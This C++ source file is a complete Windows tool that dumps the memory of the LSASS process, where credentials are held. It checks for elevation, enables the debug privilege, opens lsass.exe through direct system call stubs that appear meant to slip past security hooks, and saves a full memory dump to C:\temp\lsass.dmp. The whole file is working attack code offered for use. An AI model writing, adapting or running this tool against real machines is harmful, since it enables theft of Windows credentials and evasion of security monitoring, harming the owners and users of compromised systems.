#include "syscall.h"
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <tchar.h>

#pragma comment(lib, "Dbghelp.lib")

using namespace std;

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)  // Manually define STATUS_SUCCESS if not already defined
#endif

void InitializeSystemCalls() {
    g_ZwOpenProcess = ZwOpenProcess10;
    g_ZwClose = ZwClose10;
    g_ZwWriteVirtualMemory = ZwWriteVirtualMemory10;
    g_ZwProtectVirtualMemory = ZwProtectVirtualMemory10;
    g_ZwQuerySystemInformation = ZwQuerySystemInformation10;
    g_NtCreateFile = NtCreateFile10;
}

bool IsElevated() {
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            CloseHandle(hToken);
            return elevation.TokenIsElevated != 0;
        }
        CloseHandle(hToken);
    }
    return false;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                CloseHandle(hToken);
                return GetLastError() == ERROR_SUCCESS;
            }
        }
        CloseHandle(hToken);
    }
    return false;
}

DWORD GetLsassPID() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_tcsicmp(pe.szExeFile, _T("lsass.exe")) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

bool CreateMiniDump(HANDLE processHandle, DWORD processId) {
    TCHAR defaultDir[] = _T("C:\\temp");
    TCHAR filePath[MAX_PATH] = _T("");

    if (GetFileAttributes(defaultDir) == INVALID_FILE_ATTRIBUTES) {
        if (!CreateDirectory(defaultDir, NULL)) {
            _tprintf(_T("Failed to create directory: %s\n"), defaultDir);
            return false;
        }
    }

    _tprintf(_T("Enter the path to save the dump file default: C:\\temp\\lsass.dmp: "));
    _fgetts(filePath, MAX_PATH, stdin);

    size_t len = _tcslen(filePath);
    if (len > 0 && filePath[len - 1] == _T('\n')) {
        filePath[len - 1] = _T('\0');
    }

    if (_tcslen(filePath) == 0) {
        _stprintf_s(filePath, _T("%s\\lsass.dmp"), defaultDir);
    }

    HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _tprintf(_T("Failed to create dump file at: %s\n"), filePath);
        return false;
    }

    BOOL success = MiniDumpWriteDump(processHandle, processId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    CloseHandle(hFile);

    if (!success) {
        _tprintf(_T("Failed to dump lsass.exe to: %s\n"), filePath);
        return false;
    }

    _tprintf(_T("Dump created successfully at: %s\n"), filePath);
    return true;
}


int main() {
    InitializeSystemCalls();

    if (!IsElevated()) {
        cout << "You need elevated privileges to run this tool!\n";
        return 1;
    }

    EnableDebugPrivilege();

    DWORD lsassPID = GetLsassPID();
    if (lsassPID == 0) {
        cout << "Failed to find lsass.exe.\n";
        return 1;
    }

    HANDLE hLsass;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(lsassPID)), nullptr };

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    NTSTATUS status = g_ZwOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);

    if (status != STATUS_SUCCESS) {
        cout << "Failed to open lsass.exe with error: " << hex << status << endl;
        return 1;
    }

 
    if (!CreateMiniDump(hLsass, lsassPID)) {
        g_ZwClose(hLsass);
        return 1;
    }

    g_ZwClose(hLsass);
    return 0;
}
